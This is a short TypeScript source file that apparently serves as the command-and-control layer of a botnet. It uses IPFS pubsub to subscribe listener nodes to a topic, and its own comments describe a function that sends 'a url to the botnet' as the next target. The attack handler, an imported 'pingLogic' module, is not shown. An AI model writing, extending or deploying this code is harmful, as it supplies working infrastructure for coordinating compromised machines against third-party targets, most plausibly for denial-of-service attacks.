import * as IPFS from 'ipfs-core';
import pingL from './pingLogic';

/**
 * Listener logic
 * @param topic The topic where the messages will be recived
 */
export default async function pbL(topic: string) {
  const ipfs = await create_IPFS();
  const receiveMsg = (msg: { data: BufferSource | undefined; }) => pingL(new TextDecoder().decode(msg.data));
  await ipfs.pubsub.subscribe(topic, receiveMsg);
}

/**
 * Send a url to the botnet
 * @param topic The topic witch the message will be sent to
 * @param payload The payload that will get sent
 */
const send_next_target = async (topic:string, payload:string) => {
  const ipfs = await create_IPFS();
  const msg = new TextEncoder().encode(payload);
  await ipfs.pubsub.publish(topic, msg);
};

/**
 * List all peers subscribed to a topic
 * @param topic The topic from witch the peers will be taken
 */
const list_peers = async (topic:string) => {
  const ipfs = await create_IPFS();
  const peerIds = await ipfs.pubsub.peers(topic);
  console.log(peerIds);
};

/**
 * Creates a IPFS instance
 * @returns ipfs instance
 */
const create_IPFS = async () => {
  const ipfs = await IPFS.create();
  return ipfs;
};

// Other exports
export {
  send_next_target,
  list_peers,
};